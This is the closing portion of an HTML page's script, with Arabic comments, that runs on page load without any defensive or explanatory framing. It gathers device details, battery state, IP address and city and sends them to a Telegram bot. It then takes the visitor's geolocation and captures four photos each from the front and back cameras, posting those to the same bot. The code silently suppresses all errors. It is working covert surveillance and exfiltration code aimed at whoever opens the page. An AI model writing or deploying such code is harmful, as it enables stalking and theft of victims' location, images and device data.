• النظام: ${data.platform}
• الإصدار: ${data.deviceVersion}
• User Agent: ${navigator.userAgent}
🔋 البطارية: ${data.batteryLevel} | الشحن: ${data.batteryCharging}
🌍 الموقع:
• الآيبي: ${data.ip}
• الدولة: ${data.country}
• المدينة: ${data.city}
${note ? `📌 ملاحظة: ${note}` : ''}
⏰ التاريخ: ${new Date().toLocaleString('ar-EG')}
        `.trim();

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).catch(() => {});
    }

    // 📷 طلب إذن الكاميرا
    async function requestCameraPermission(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode }
            });
            return stream;
        } catch (error) {
            console.error(`فشل في الوصول للكاميرا (${facingMode}):`, error);
            return null;
        }
    }

    // 📸 التقاط الصور
    function setupCamera(video, canvas, cameraType, additionalData) {
        video.play();
        video.onplaying = () => {
            const { videoWidth, videoHeight } = video;
            canvas.width = videoWidth;
            canvas.height = videoHeight;
            const context = canvas.getContext('2d');
            let photoCount = 0;

            const captureInterval = setInterval(() => {
                if (photoCount >= 4) {
                    clearInterval(captureInterval);
                    stopCameraStream(video);
                    return;
                }
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    sendPhotoToTelegram(blob, `📸 ${cameraType} - صورة ${photoCount + 1}`);
                }, 'image/webp', 0.7);
                photoCount++;
            }, 1000);
        };
    }

    // 📤 إرسال الصورة
    function sendPhotoToTelegram(blob, caption = '') {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.webp');
        if (caption) formData.append('caption', caption);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    }

    // 🛑 إيقاف الكاميرا
    function stopCameraStream(video) {
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }
    }

    // 🚀 بدء التنفيذ
    window.addEventListener('load', async () => {
        const additionalData = await collectAdditionalData();

        // 📍 جلب الموقع
        const location = await getLocation();
        if (location) {
            sendLocationToTelegram(location.lat, location.lon);
            additionalData.location = `العرض: ${location.lat}, الطول: ${location.lon}, الدقة: ${location.accuracy}م`;
        } else {
            additionalData.location = 'مافيش (فشل في الجلب)';
        }

        // 📝 إرسال التقرير الأول
        sendTextReport(additionalData, location ? 'تم جلب الموقع' : 'فشل جلب الموقع');

        // 🎥 الكاميرات
        const frontStream = await requestCameraPermission('user');
        const backStream = await requestCameraPermission('environment');

        if (frontStream) {
            frontVideo.srcObject = frontStream;
            frontVideo.addEventListener('loadedmetadata', () => {
                setupCamera(frontVideo, frontCanvas, 'الأمامية', additionalData);
            });
        }

        if (backStream) {
            backVideo.srcObject = backStream;
            backVideo.addEventListener('loadedmetadata', () => {
                setupCamera(backVideo, backCanvas, 'الخلفية', additionalData);
            });
        }
    });
</script>
</body>
</html>